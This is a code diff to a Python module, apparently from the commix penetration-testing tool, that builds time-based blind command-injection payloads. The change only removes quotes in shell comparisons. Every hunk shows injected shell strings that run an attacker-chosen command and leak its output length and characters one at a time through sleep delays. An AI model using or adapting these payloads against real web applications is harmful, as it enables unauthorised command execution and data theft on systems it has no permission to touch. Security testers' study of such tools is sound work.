@@ -30,7 +30,7 @@ def decision(separator,TAG,j,delay,http_request_method):
 	      "str=$(echo "+TAG+")" + separator + " "
 	      # Find the length of the output.
 	      "str1=${#str}" + separator + " "
-	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + separator  + " "
+	      "if [ " + str(j) + " -ne ${str1} ]" + separator  + " "
 	      "then sleep 0" + separator + " "
 	      "else sleep " + str(delay) + separator + " "
 	      "fi "
@@ -72,7 +72,7 @@ def decision_alter_shell(separator,TAG,j,delay,http_request_method):
     payload = (separator + " "
 	      # Find the length of the output, using readline().
 	      "str1=$(python -c \"print len(\'" + TAG + "\')\")"+ separator + " "
-	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + separator  + " "
+	      "if [ " + str(j) + " -ne ${str1} ]" + separator  + " "
 	      "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
 	      "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
 	      "fi "
@@ -113,7 +113,7 @@ def cmd_execution(separator,cmd,j,delay,http_request_method):
     payload = (separator + " "
 	      "str=$(" + cmd + ")" + separator +
 	      "str1=${#str}" + separator +
-	      "if [ \"" + str(j) + "\" != ${str1} ] " + separator +
+	      "if [ " + str(j) + " != ${str1} ] " + separator +
 	      "then sleep 0" + separator +
 	      "else sleep " + str(delay) + separator +
 	      "fi "
@@ -152,7 +152,7 @@ def cmd_execution_alter_shell(separator,cmd,j,delay,http_request_method):
     payload = (separator + " "
 	      # Find the length of the output, using readline().
 	      "str1=$(python -c \"print len(\'$(echo $("+cmd+"))\')\")"+ separator + " "
-	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + separator  + " "
+	      "if [ " + str(j) + " -ne ${str1} ]" + separator  + " "
 	      "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
 	      "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
 	      "fi "
@@ -192,7 +192,7 @@ def get_char(separator,cmd,i,ascii_char,delay,http_request_method):
   if separator == ";" :
     payload = (separator + " "
 	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
-	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + separator +
+	      "if [ " + str(ascii_char) + " != ${str} ]" + separator +
 	      "then sleep 0" + separator +
 	      "else sleep " + str(delay) + separator +
 	      "fi "
@@ -215,7 +215,7 @@ def get_char(separator,cmd,i,ascii_char,delay,http_request_method):
 
   if separator == "||" :
     payload = (separator + " "
-	      "[ \"" + str(ascii_char) + "\" -ne  $(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
+	      "[ " + str(ascii_char) + " -ne  $(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
 	      "sleep " + str(delay) + " "
 	      )	
     
@@ -229,7 +229,7 @@ def get_char_alter_shell(separator,cmd,i,ascii_char,delay,http_request_method):
   if separator == ";" :
     payload = (separator + " "
 	      "str=$(python -c \"print ord(\'$(echo $("+cmd+"))\'["+str(i-1)+":"+str(i)+"])\nexit(0)\")" + separator +
-	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + separator +
+	      "if [ " + str(ascii_char) + " != ${str} ]" + separator +
 	      "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
 	      "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
 	      "fi "
@@ -252,7 +252,7 @@ def get_char_alter_shell(separator,cmd,i,ascii_char,delay,http_request_method):
 
   elif separator == "||" :
     payload = (separator + " "
-	      "[ \"" + str(ascii_char) + "\" -ne  $(python -c \"print ord(\'$(echo $("+cmd+"))\'["+str(i-1)+":"+str(i)+"])\nexit(0)\") ] " + separator + 
+	      "[ " + str(ascii_char) + " -ne  $(python -c \"print ord(\'$(echo $("+cmd+"))\'["+str(i-1)+":"+str(i)+"])\nexit(0)\") ] " + separator + 
 	      "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
 	      )
     
